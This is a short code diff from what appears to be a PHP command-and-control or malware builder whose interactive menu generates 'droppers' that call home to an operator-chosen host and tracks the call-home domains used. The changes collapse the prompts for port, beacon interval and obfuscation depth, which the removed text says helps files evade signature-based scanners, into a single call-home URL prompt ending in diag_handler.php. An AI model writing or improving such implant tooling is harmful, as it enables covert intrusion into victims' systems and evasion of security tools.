@@ -596,7 +596,6 @@ function createDropper($callHome)
     $inDB = new postgres_checker();
     if (!empty($callHome)) {
         try {
-            print("Generated dropper will be: {$ob}\n");
             $rtValues = $t->slim_dropper($callHome, '', true);
             $inDB->countUsedDomains($callHome);
             system("ls -lah includes/droppers/dynamic/slim");
@@ -1035,21 +1034,9 @@ while ($run) {
             $h_port = null;
             $d_int = null;
             $osb = null;
-            echo("Where are we calling home to? (hostname/ip)->");
+            echo("Where are we calling home to? [(http/https)://hostname|ip:port/diag_handler.php]->");
             $h_name = trim(fgets(STDIN));
-            echo("Which port are we calling home on?");
-            $h_port = trim(fgets(STDIN));
-            echo("How often should we call home? (int) ->");
-            $d_int = trim(fgets(STDIN));
-            echo("Do we need to obfuscate? (y/n) ->");
-            $osb = trim(fgets(STDIN));
-            if (strtolower($osb) == "y") {
-                echo("Level of depth? This will add more randomness to the file making it less likely to be caught by signature based scanners. (int) ->");
-                $de = trim(fgets(STDIN));
-            } else {
-                $de = "0";
-            }
-            createDropper($h_name, $h_port, $d_int, $osb, $de);
+            createDropper($h_name);
             break;
         case "sys":
             system(clears);
